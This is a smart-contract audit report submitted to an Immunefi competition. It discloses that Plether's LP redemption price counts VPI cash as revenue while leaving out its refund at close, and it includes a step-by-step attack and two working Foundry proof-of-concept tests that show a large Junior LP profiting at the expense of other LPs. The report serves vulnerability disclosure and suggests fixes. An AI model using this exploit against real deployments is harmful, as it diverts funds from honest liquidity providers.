# \#97834 [SC-Critical] VPI cash is priced into LP NAV but its refund is not, so a large Junior LP can redeem at an inflated price

**Submitted on Nov 3rd 2026 at 14:07:52 UTC by @vzmahh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97834
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Virtual price impact (VPI) charged on an open is booked as LP revenue at once, while the same amount is refunded to the same position at its close (lifetime clamp) and is excluded from the terminal LP price. LP shares therefore redeem at a NAV that includes cash the pool still owes back. A Junior LP holding more than about 40% of the Junior tranche can queue a full redemption, open a one-sided position of about 40% of pool depth through a second account just before the epoch settles, let `settleLpEpoch` burn its shares at the inflated NAV, and close at the same mark. The round trip costs only execution fees, and the remaining Junior LPs pay the rebate after the attacker has left.

## Vulnerability Details

1. The cash is booked as revenue immediately. On open, the positive trade cost that includes VPI goes to the pool through `recordClaimantInflow(..., ClaimantInflowKind.Revenue, ...)` (`CfdEngineSettlementSidecar.sol:454-464`).
2. The same amount is owed back. On close, the rebate is paid out of the pool (`CfdEngineSettlementSidecar.sol:621-624`, `actionRebatePaidAssets`), and `CloseAccountingLib.sol:112-118` clamps lifetime VPI at zero, so at an unchanged mark the rebate equals the VPI paid.
3. The liability is not in the price. `ACCOUNTING_SPEC.md:140-142` excludes VPI from the terminal LP price delta, and `HousePool._settleLpEpoch` reconciles to the current NAV and then burns and funds redemptions at that price (`HousePool.sol:824-860`). Cash is counted, the refund obligation is not, and there is no cohort allocation of contingently refundable VPI.

This is not the accepted carry policy. `ACCOUNTING_SPEC.md:731-740` ("LP ownership follows collection time") accepts timing around carry because collected carry is final revenue. VPI is different: it is returned to the paying position at close, so it is a deposit-like liability that LPs exiting early should not capture. The mispricing exists for any LP exit or entry while an open position carries accrued VPI; the attacker only chooses the timing and the size.

### Attack

Release parameters (vpiFactor 1%, execution fee 4 bps, maintenance 0.1%, initial 0.2%), all calls public, Pyth mocked.
1. Junior LP A holds a large share of the Junior tranche and requests a full redemption for the next epoch.
2. After the epoch boundary, A's second account opens one LONG of 40% of pool depth through `router.commitOrder` and `executeOrder`. VPI of 0.5 * k * S^2 / D is charged and booked as LP revenue.
3. Anyone calls `router.settleLpEpoch`; A's shares are burned at the inflated NAV.
4. A's second account closes at the same mark. The rebate (net of the close execution fee) is paid out of the pool, which now belongs to the remaining LPs.

The gain is about r x X minus two execution fees, where r is A's share of the Junior tranche and X the VPI. At the 40% skew cap this is profitable when r is above about 40%.

## Impact Details

Mechanism, pool of 100M USDG (PoC test `test_mechanism_vpiCashBookedAtOpenAndRefundedAtClose`): pool assets 100,002,000 before the open, 100,082,001 after it (+80,001 booked at once), 100,018,064 after the close at the same mark (the rebate leaves, net of the close fee).

Scenarios from one snapshot against a control run (USDG, per cycle, after paying both execution fees; `test_sensitivity_attackerShareOfJunior`):

| Pool | Attacker share of Junior | Attacker profit | Honest Junior LP loss |
|---|---|---|---|
| Junior 100M, no Senior | 60% | +15,892 | 31,892 |
| Junior 100M, no Senior | 40% | 0 | 15,999 |
| Junior 100M, no Senior | 20% | -16,000 | 0 |
| Junior 100M, Senior 40M (release cap) | 60% | +22,399 | 44,798 |
| Junior 100M, Senior 40M (release cap) | 40% | 0 | 22,399 |

Value moves from the remaining Junior LPs to the attacker, and the cycle repeats as capital moves out and back in. At the break-even share the attacker pays nothing and the honest LPs still lose 16k to 22k per cycle. The loss per cycle is small relative to the pool (about 0.08% of the honest LPs' stake in the first row), but it needs no special state and scales with pool size.

## Why this is not a known issue

- The accepted collection-time ownership policy is written for carry (see above); VPI is described only as telescoping at constant depth, and `WHITEPAPER.md` section 10.3 ("VPI scope") says changing depth and lifetime clamps alter path outcomes.
- The clamp comment at `CloseAccountingLib.sol:112-115` addresses a depth-sandwich on the rebate, not the pricing of LP redemptions against VPI revenue.
- None of the three prior reports covers it (Cecuro MED-22 is carry rounding, MED-24 and MED-29 are redemption rounding).

## Suggested mitigation

Price the refundable VPI as a liability in the NAV used for redemptions and deposits, or book VPI paid at open into a separate bucket that is allocated to LPs only when the position closes (or is liquidated); alternatively do not settle an LP epoch while open skew carries unreleased VPI.


## Proof of Concept

## Proof of Concept

Copy both files into `packages/perps/test/perps/poc/vpi/` and run from `packages/perps`:

```
forge test --match-path "test/perps/poc/vpi/*.t.sol" -vv
```

`VpiJitRedeemPoc.t.sol` (`test_poc_vpiRoundTripPumpsRedemptionNav`) runs a control and the attack from one snapshot using only public entrypoints. Logs: `attacker profit vs control: 15893139108`, `honest LP loss vs control: 31892661804`, `treasury fees, attack: 16000320000`; assertions `assertGt(attackerProfit, 0)` and `assertGt(honestLoss, 0)`.

`VpiJitSensitivity.t.sol` adds `test_mechanism_vpiCashBookedAtOpenAndRefundedAtClose` (pool assets after open above the starting value by more than 70,000 USDG, after close below the post-open value by more than 60,000 USDG) and `test_sensitivity_attackerShareOfJunior` (the table above). Three tests pass.

### VpiJitRedeemPoc.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

/// @title VpiJitRedeemPoc
/// @notice PoC: a Junior LP that also trades through the public Router can pump the NAV used by a synchronized
///         redemption with a round-trip VPI charge, then take the VPI back through the lifetime-clamped close rebate.
///         The VPI charge is booked as LP revenue the moment the open executes; the matching rebate is only paid at the
///         close, after `settleLpEpoch` has already burned the attacker's shares at the pumped NAV. The remaining LPs
///         absorb the rebate. Release parameters: vpiFactor 0.01, execution fee 4 bps, maintenance 0.1%, init 0.2%.
///
///         Control vs attack are run from the same snapshot; every call is a public entrypoint (Router commit /
///         execute / settleLpEpoch / TrancheVault request-claim) with mock Pyth data.
contract VpiJitRedeemPocTest is HousePoolAsyncTestBase {

    address internal constant HONEST = address(0xA11CE);
    address internal constant ATT = address(0xA77AC);
    address internal constant TRADER = address(0x7A4DE); // attacker's second account

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, // DEPLOYMENT.md release value
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    struct Outcome {
        int256 attackerWealthDelta; // ATT LP wealth + TRADER wealth, vs funding
        uint256 honestNav;
        uint256 treasury;
    }

    uint256 internal constant HONEST_DEPOSIT = 40_000_000e6;
    uint256 internal constant ATT_DEPOSIT = 60_000_000e6;
    uint256 internal constant TRADER_FUNDING = 1_500_000e6;

    function _scenario(
        bool attack
    ) internal returns (Outcome memory o) {
        _depositAsync(juniorVault, HONEST, HONEST_DEPOSIT);
        (, uint256 attShares) = _depositAsync(juniorVault, ATT, ATT_DEPOSIT);
        _finishAsyncCooldown(juniorVault, HONEST);
        _finishAsyncCooldown(juniorVault, ATT);

        // 1. attacker queues a full redemption for the next epoch
        uint256 requestId = _requestAsyncRedeem(juniorVault, ATT, attShares);

        // 2. cross the epoch boundary
        vm.warp(pool.lpEpochStart(requestId) + 1);

        uint256 size;
        if (attack) {
            // 3. open 40% of pool depth in one direction through the Router (trader == its own keeper)
            _fundTrader(TRADER, TRADER_FUNDING);
            size = (((pool.totalAssets() * 40) / 100) / 100e6) * 100e18; // whole 100-token lots, price 1.0
            vm.prank(TRADER);
            uint64 openId = router.commitOrder(CfdTypes.Side.LONG, size, TRADER_FUNDING - 200_000e6, 0, false);
            bytes[] memory openData = _mockPythUpdateData(1e8);
            vm.prank(TRADER);
            OrderV3Types.ExecutionResult memory r1 = router.executeOrder(openId, openData);
            assertEq(uint8(r1.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open must execute");
        }

        // 4. anyone settles the matured epoch through the Router (live positions require the Router path)
        bytes[] memory settleData = _mockPythUpdateData(1e8);
        router.settleLpEpoch(settleData);

        if (attack) {
            // 5. unwind at the same mark: lifetime-clamped rebate returns the VPI to the attacker
            vm.prank(TRADER);
            uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
            bytes[] memory closeData = _mockPythUpdateData(1e8);
            vm.prank(TRADER);
            OrderV3Types.ExecutionResult memory r2 = router.executeOrder(closeId, closeData);
            assertEq(uint8(r2.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close must execute");
        }

        (, uint256 redeemed) = _claimAsyncRedeem(juniorVault, requestId, ATT);
        uint256 unfundedShares = juniorVault.pendingRedeemRequest(requestId, ATT);
        uint256 attLp = redeemed + juniorVault.convertToAssets(unfundedShares + juniorVault.balanceOf(ATT));

        uint256 traderWealth = attack ? clearinghouse.balanceAssets(TRADER) : 0;
        o.attackerWealthDelta = int256(attLp + traderWealth) - int256(ATT_DEPOSIT) - int256(attack ? TRADER_FUNDING : 0);
        o.honestNav = juniorVault.convertToAssets(juniorVault.balanceOf(HONEST));
        o.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function test_poc_vpiRoundTripPumpsRedemptionNav() public {
        uint256 snap = vm.snapshotState();
        Outcome memory control = _scenario(false);
        vm.revertToState(snap);
        Outcome memory attack = _scenario(true);

        emit log_named_int("attacker net (LP leg + trader leg), control", control.attackerWealthDelta);
        emit log_named_int("attacker net (LP leg + trader leg), attack ", attack.attackerWealthDelta);
        emit log_named_uint("honest LP NAV, control", control.honestNav);
        emit log_named_uint("honest LP NAV, attack ", attack.honestNav);
        emit log_named_uint("treasury fees, attack", attack.treasury);

        int256 attackerProfit = attack.attackerWealthDelta - control.attackerWealthDelta;
        int256 honestLoss = int256(control.honestNav) - int256(attack.honestNav);
        emit log_named_int("attacker profit vs control", attackerProfit);
        emit log_named_int("honest LP loss vs control", honestLoss);

        assertGt(attackerProfit, 0, "attacker must end strictly richer after paying both execution fees");
        assertGt(honestLoss, 0, "remaining LPs pay for it");
    }

}
```

### VpiJitSensitivity.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// @notice Sensitivity of the VPI round-trip redemption attack (see VpiJitRedeemPoc): who profits as the attacker's share
///         of the Junior tranche changes, with and without Senior capital in the pool. Control and attack run from the
///         same snapshot; every call is a public entrypoint with mock Pyth data. Release parameters.
contract VpiJitSensitivityTest is HousePoolAsyncTestBase {

    address internal constant HONEST = address(0xA11CE);
    address internal constant ATT = address(0xA77AC);
    address internal constant SENIOR = address(0x5E410);
    address internal constant TRADER = address(0x7A4DE);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    struct Outcome {
        int256 attackerDelta;
        uint256 honestNav;
    }

    function _scenario(
        bool attack,
        uint256 honestJ,
        uint256 attJ,
        uint256 seniorD
    ) internal returns (Outcome memory o) {
        _depositAsync(juniorVault, HONEST, honestJ);
        (, uint256 attShares) = _depositAsync(juniorVault, ATT, attJ);
        if (seniorD > 0) {
            _depositAsync(seniorVault, SENIOR, seniorD);
        }
        _finishAsyncCooldown(juniorVault, HONEST);
        _finishAsyncCooldown(juniorVault, ATT);

        uint256 requestId = _requestAsyncRedeem(juniorVault, ATT, attShares);
        vm.warp(pool.lpEpochStart(requestId) + 1);

        uint256 size;
        uint256 funding = 3_000_000e6;
        if (attack) {
            _fundTrader(TRADER, funding);
            size = (((pool.totalAssets() * 40) / 100) / 100e6) * 100e18;
            vm.prank(TRADER);
            uint64 openId = router.commitOrder(CfdTypes.Side.LONG, size, funding - 300_000e6, 0, false);
            vm.prank(TRADER);
            OrderV3Types.ExecutionResult memory r1 = router.executeOrder(openId, _mockPythUpdateData(1e8));
            assertEq(uint8(r1.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open must execute");
        }

        router.settleLpEpoch(_mockPythUpdateData(1e8));

        if (attack) {
            vm.prank(TRADER);
            uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
            vm.prank(TRADER);
            OrderV3Types.ExecutionResult memory r2 = router.executeOrder(closeId, _mockPythUpdateData(1e8));
            assertEq(uint8(r2.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close must execute");
        }

        (, uint256 redeemed) = _claimAsyncRedeem(juniorVault, requestId, ATT);
        uint256 unfunded = juniorVault.pendingRedeemRequest(requestId, ATT);
        uint256 attLp = redeemed + juniorVault.convertToAssets(unfunded + juniorVault.balanceOf(ATT));
        uint256 traderWealth = attack ? clearinghouse.balanceAssets(TRADER) : 0;
        o.attackerDelta = int256(attLp + traderWealth) - int256(attJ) - int256(attack ? funding : 0);
        o.honestNav = juniorVault.convertToAssets(juniorVault.balanceOf(HONEST));
    }

    function _measure(
        uint256 honestJ,
        uint256 attJ,
        uint256 seniorD
    ) internal returns (int256 profit, int256 honestLoss) {
        uint256 snap = vm.snapshotState();
        Outcome memory c = _scenario(false, honestJ, attJ, seniorD);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory a = _scenario(true, honestJ, attJ, seniorD);
        vm.revertToState(snap);
        profit = a.attackerDelta - c.attackerDelta;
        honestLoss = int256(c.honestNav) - int256(a.honestNav);
    }

    function _log(
        string memory label,
        uint256 honestJ,
        uint256 attJ,
        uint256 seniorD
    ) internal {
        (int256 profit, int256 honestLoss) = _measure(honestJ, attJ, seniorD);
        emit log_string(label);
        emit log_named_int("  attacker profit vs control (USDG)", profit / 1e6);
        emit log_named_int("  honest Junior LP loss vs control (USDG)", honestLoss / 1e6);
    }

    /// @notice Mechanism: the VPI cash lands in the pool (and is priced into LP NAV) at the open and leaves at the close,
    ///         with no refundable-liability term in between.
    function test_mechanism_vpiCashBookedAtOpenAndRefundedAtClose() public {
        _depositAsync(juniorVault, HONEST, 40_000_000e6);
        _depositAsync(juniorVault, ATT, 60_000_000e6);
        _finishAsyncCooldown(juniorVault, HONEST);
        _finishAsyncCooldown(juniorVault, ATT);
        vm.warp(block.timestamp + 1 days);

        uint256 funding = 3_000_000e6;
        _fundTrader(TRADER, funding);
        uint256 size = (((pool.totalAssets() * 40) / 100) / 100e6) * 100e18;
        uint256 assets0 = pool.totalAssets();

        vm.prank(TRADER);
        uint64 openId = router.commitOrder(CfdTypes.Side.LONG, size, funding - 300_000e6, 0, false);
        vm.prank(TRADER);
        router.executeOrder(openId, _mockPythUpdateData(1e8));
        uint256 assetsOpen = pool.totalAssets();

        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
        vm.prank(TRADER);
        router.executeOrder(closeId, _mockPythUpdateData(1e8));
        uint256 assetsClose = pool.totalAssets();

        emit log_named_uint("pool totalAssets before open (USDG)", assets0 / 1e6);
        emit log_named_uint("pool totalAssets after open (USDG)", assetsOpen / 1e6);
        emit log_named_uint("pool totalAssets after close at the same mark (USDG)", assetsClose / 1e6);
        assertGt(assetsOpen, assets0 + 70_000e6, "VPI cash is booked into the pool at the open");
        // The close pays the rebate back (net of the close execution fee, which the pool keeps), so almost all of the
        // VPI leaves the pool again; between the two events it was counted as LP NAV.
        assertLt(assetsClose, assetsOpen - 60_000e6, "the VPI leaves the pool at the close");
        assertLt(assetsClose, assets0 + 20_000e6, "after the round trip the pool keeps only the close fee");
    }

    function test_sensitivity_attackerShareOfJunior() public {
        _log("A: junior 100M, attacker 60%, no senior", 40_000_000e6, 60_000_000e6, 0);
        _log("B: junior 100M, attacker 40%, no senior", 60_000_000e6, 40_000_000e6, 0);
        _log("C: junior 100M, attacker 20%, no senior", 80_000_000e6, 20_000_000e6, 0);
        _log("D: junior 100M, attacker 60%, senior 40M (release cap)", 40_000_000e6, 60_000_000e6, 40_000_000e6);
        _log("E: junior 100M, attacker 40%, senior 40M (release cap)", 60_000_000e6, 40_000_000e6, 40_000_000e6);
    }

}
```

